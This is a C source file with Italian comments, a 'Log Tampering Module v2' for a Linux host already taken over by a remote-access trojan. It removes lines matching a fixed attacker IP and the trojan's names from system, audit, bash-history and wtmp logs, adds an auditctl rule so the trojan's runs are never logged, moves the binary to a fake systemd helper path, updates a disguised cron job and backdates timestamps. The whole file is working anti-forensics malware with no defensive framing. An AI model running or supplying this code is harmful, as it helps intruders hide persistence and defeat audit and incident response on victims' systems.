#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

/* ── Log Tampering Module v2 ─────────────────────────────────
 * Approccio chirurgico — rimuove solo le tracce dell'attaccante
 * NON tocca il journal systemd — troppo rischioso
 * Previene il logging invece di cancellare dopo
 */

#define ATTACKER_IP  "192.168.18.132"
#define RAT_PATH     "/usr/lib/systemd/systemd-network-helper"
#define RAT_OLD_NAME ".sysd"

/* ── Rimozione chirurgica da file di testo ──────────────────
 * Rimuove SOLO le righe con il pattern specificato
 * Lascia tutto il resto intatto — non crea gap sospetti
 */
int remove_lines_containing(const char *filepath, const char *pattern) {
    char tmpfile[256];
    snprintf(tmpfile, sizeof(tmpfile), "%s.tmp.%d", filepath, getpid());

    FILE *in = fopen(filepath, "r");
    if (!in) return -1;

    FILE *out = fopen(tmpfile, "w");
    if (!out) { fclose(in); return -1; }

    char line[4096];
    int removed = 0;
    int total = 0;

    while (fgets(line, sizeof(line), in)) {
        total++;
        if (strstr(line, pattern) == NULL) {
            fputs(line, out);
        } else {
            removed++;
        }
    }

    fclose(in);
    fclose(out);

    /* Sostituzione atomica — non lascia file temporanei visibili */
    rename(tmpfile, filepath);

    /* Preserva i permessi originali */
    chmod(filepath, 0640);

    if (removed > 0)
        printf("[+] %s: rimossi %d/%d righe con '%s'\n",
               filepath, removed, total, pattern);
    return removed;
}

/* ── Pulizia log di testo ───────────────────────────────────
 * Rimuove IP attaccante e nomi RAT dai log di sistema
 * Approccio: chirurgico, non cancella tutto
 */
void clean_text_logs() {
    printf("[*] Pulizia chirurgica log di testo...\n");

    const char *log_files[] = {
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/kern.log",
        "/var/log/daemon.log",
        "/var/log/dpkg.log",
        NULL
    };

    const char *patterns[] = {
        ATTACKER_IP,
        RAT_OLD_NAME,
        "systemd-network-helper",
        "dns_client",
        "persistence",
        "privesc",
        NULL
    };

    for (int i = 0; log_files[i]; i++) {
        if (access(log_files[i], W_OK) == 0) {
            for (int j = 0; patterns[j]; j++) {
                remove_lines_containing(log_files[i], patterns[j]);
            }
        }
    }
}

/* ── Pulizia audit log ───────────────────────────────────────
 * auditd scrive in file di testo — possiamo essere chirurgici
 * Rimuoviamo solo gli eventi relativi al RAT
 */
void clean_audit_logs() {
    printf("[*] Pulizia log auditd...\n");

    const char *audit_patterns[] = {
        ATTACKER_IP,
        "systemd-network-helper",
        RAT_OLD_NAME,
        "dns_client",
        NULL
    };

    const char *audit_files[] = {
        "/var/log/audit/audit.log",
        "/var/log/audit/audit.log.1",
        NULL
    };

    for (int i = 0; audit_files[i]; i++) {
        if (access(audit_files[i], W_OK) == 0) {
            for (int j = 0; audit_patterns[j]; j++) {
                remove_lines_containing(audit_files[i], audit_patterns[j]);
            }
        }
    }
}

/* ── Previeni logging futuro con auditctl ───────────────────
 * Invece di cancellare dopo, diciamo ad auditd
 * di non loggare mai le esecuzioni del RAT
 * Molto più pulito — niente da cancellare
 */
void disable_audit_for_rat() {
    printf("[*] Disabilitazione audit per il processo RAT...\n");

    char cmd[512];

    /* Esclude il path del RAT dall'auditing */
    snprintf(cmd, sizeof(cmd),
        "auditctl -a never,exit -F path=%s 2>/dev/null", RAT_PATH);
    system(cmd);

    /* Esclude anche il vecchio path se esiste */
    system("auditctl -a never,exit "
           "-F path=/usr/local/sbin/.sysd 2>/dev/null");

    printf("[+] auditctl: esecuzioni RAT escluse dal logging\n");
}

/* ── Pulizia bash history chirurgica ────────────────────────
 * Rimuove solo i comandi sospetti
 * Lascia intatta la history normale dell'utente
 */
void clean_bash_history() {
    printf("[*] Pulizia bash history...\n");

    const char *suspicious[] = {
        RAT_OLD_NAME,
        "dns_client",
        "persistence",
        "privesc",
        "log_tamper",
        "192.168.18.132",
        "/usr/local/sbin",
        NULL
    };

    /* History di tutti gli utenti con home */
    const char *history_files[] = {
        "/root/.bash_history",
        "/home/debian/.bash_history",
        NULL
    };

    for (int i = 0; history_files[i]; i++) {
        if (access(history_files[i], W_OK) == 0) {
            for (int j = 0; suspicious[j]; j++) {
                remove_lines_containing(history_files[i], suspicious[j]);
            }
        }
    }

    /* Svuota history in memoria per la sessione corrente */
    system("history -c 2>/dev/null");
    printf("[+] Bash history ripulita\n");
}

/* ── Spoof timestamp ─────────────────────────────────────────
 * Cambia i timestamp del RAT per farlo sembrare
 * un file di sistema vecchio e legittimo
 */
void spoof_timestamps() {
    printf("[*] Modifica timestamp file RAT...\n");

    char cmd[512];

    /* Data vecchia — sembra installato con il sistema */
    snprintf(cmd, sizeof(cmd),
        "touch -t 202301010000 %s 2>/dev/null", RAT_PATH);
    system(cmd);

    /* Stessa data per il cron job */
    system("touch -t 202301010000 "
           "/etc/cron.d/apt-daily-security 2>/dev/null");

    printf("[+] Timestamp modificati — sembrano file di sistema\n");
}

/* ── Rinomina RAT con nome convincente ──────────────────────
 * Sposta il binario in path e nome che sembrano legittimi
 * systemd-network-helper è convincente perché:
 * - sta in /usr/lib/systemd/ come i veri helper
 * - il nome imita i servizi systemd reali
 */
void relocate_rat() {
    printf("[*] Spostamento RAT in posizione convincente...\n");

    /* Crea la directory se non esiste */
    system("mkdir -p /usr/lib/systemd/ 2>/dev/null");

    /* Copia nella nuova posizione */
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "cp /usr/local/sbin/.sysd %s 2>/dev/null", RAT_PATH);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "chmod +x %s 2>/dev/null", RAT_PATH);
    system(cmd);

    /* Aggiorna il cron job */
    system("sed -i "
           "'s|/usr/local/sbin/.sysd"
           "|/usr/lib/systemd/systemd-network-helper|g' "
           "/etc/cron.d/apt-daily-security 2>/dev/null");

    /* Rimuove il vecchio binario */
    system("rm -f /usr/local/sbin/.sysd 2>/dev/null");

    printf("[+] RAT spostato in %s\n", RAT_PATH);
    printf("[+] Cron job aggiornato\n");
}

/* ── Pulizia login logs ──────────────────────────────────────
 * wtmp e lastlog registrano gli accessi SSH
 * Li puliamo chirurgicamente dall'IP attaccante
 * NON li svuotiamo completamente — troppo sospetto
 */
void clean_login_logs() {
    printf("[*] Pulizia login logs...\n");

    /* last e wtmp sono binari — usiamo utmpdump */
    system("utmpdump /var/log/wtmp 2>/dev/null | "
           "grep -v '192.168.18.132' | "
           "utmpdump -r > /tmp/.wtmp_clean 2>/dev/null && "
           "mv /tmp/.wtmp_clean /var/log/wtmp 2>/dev/null");

    printf("[+] Login logs puliti\n");
}

/* ── Main ────────────────────────────────────────────────────
 * Esegui tutto in sequenza
 * Ordine importante: prima previeni, poi pulisci
 */
int main() {
    if (geteuid() != 0) {
        fprintf(stderr, "[!] Richiede root\n");
        return 1;
    }

    printf("[*] Log Tampering Module v2\n");
    printf("[*] Approccio chirurgico — no cancellazione totale\n\n");

    /* 1. Sposta il RAT in posizione convincente */
    relocate_rat();

    /* 2. Previeni logging futuro */
    disable_audit_for_rat();

    /* 3. Pulisci le tracce esistenti */
    clean_text_logs();
    clean_audit_logs();
    clean_bash_history();
    clean_login_logs();

    /* 4. Modifica timestamp */
    spoof_timestamps();

    printf("\n[*] Log tampering completato\n");
    printf("[*] Tracce rimosse chirurgicamente\n");
    printf("[*] Journal systemd NON toccato — troppo rischioso\n");
    return 0;
}
